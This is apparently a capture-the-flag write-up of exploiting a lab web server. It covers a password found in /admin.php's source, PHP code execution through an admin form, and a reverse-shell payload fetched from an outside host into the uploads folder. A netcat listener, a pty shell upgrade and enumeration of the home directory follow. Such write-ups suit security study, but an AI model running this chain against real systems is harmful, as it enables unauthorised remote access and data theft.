dirb gets us `/admin.php`. looking at the source code we get the password:
`skoupidotenekes`. the user is … `admin`.

So now we get a form that allows inputting `php` code. let's first try:
```
<?php echo("test"); ?>
```

works as expected!

Let's enumerate the `cwd`:
```
<?php print_r(scandir('.')); ?>
```

```
Array ( [0] => . [1] => .. [2] => admin.php [3] => bg.png [4] => index.html [5] => leet.png [6] => uploads ) 
```

ok, now we know the `uploads` path. let's try to upload a shell and execute it by opening
it from the uploads directory.

let's fetch the php-reverse-shell.php:
```
<?php file_put_contents("uploads/motoko-shell.php", fopen("http://10.10.15.144:8000/php-reverse-shell.php", 'r')); ?>
```

start a netcat listener:
```
nc -lvp 4454
```

and click on the file in the uploads folder.

upgrade to shell:
```
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

```
less /home/xalvas/user.txt
```

```
$ ls -lah
total 3.2M
drwxr-xr-x 7 xalvas xalvas 4.0K Jun 29 03:20 .
drwxr-xr-x 3 root   root   4.0K Jun 27 13:17 ..
-rw-r--r-- 1 xalvas xalvas  220 Jun 27 13:07 .bash_logout
-rw-r--r-- 1 xalvas xalvas 3.8K Jun 27 19:26 .bashrc
drwx------ 2 xalvas xalvas 4.0K Jun 27 19:36 .cache
-rw-rw-r-- 1 xalvas xalvas   43 Jun 27 18:11 .gdbinit
drwxrwxr-x 2 xalvas xalvas 4.0K Jun 27 19:24 .nano
-rw-r--r-- 1 xalvas xalvas  655 Jun 27 13:08 .profile
-rw-r--r-- 1 xalvas xalvas    0 Jun 27 13:03 .sudo_as_admin_successful
drwxr-xr-x 2 xalvas xalvas 4.0K Jun 27 13:07 alarmclocks
drwxr-x--- 2 root   xalvas 4.0K Jun 29 14:00 app
-rw-r--r-- 1 root   root    225 Jun 27 18:16 dontforget.txt
-rw-r--r-- 1 root   root   1.7K Nov  5 04:34 intrusions
drwxrwxr-x 4 xalvas xalvas 4.0K Jun 27 18:09 peda
-rw-r--r-- 1 xalvas xalvas 3.1M Jun 27 12:23 recov.wav
-rw-r--r-- 1 root   root     33 Jun 27 18:19 user.txt
```

## enumeration
```
$ set
APACHE_LOCK_DIR='/var/lock/apache2'
APACHE_LOG_DIR='/var/log/apache2'
APACHE_PID_FILE='/var/run/apache2/apache2.pid'
APACHE_RUN_DIR='/var/run/apache2'
APACHE_RUN_GROUP='www-data'
APACHE_RUN_USER='www-data'
IFS=' 	
'
LANG='C'
OLDPWD='/'
OPTIND='1'
PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
PPID='27235'
PS1='$ '
PS2='> '
PS4='+ '
PWD='/home/xalvas'
_='set'
```

18547936..*
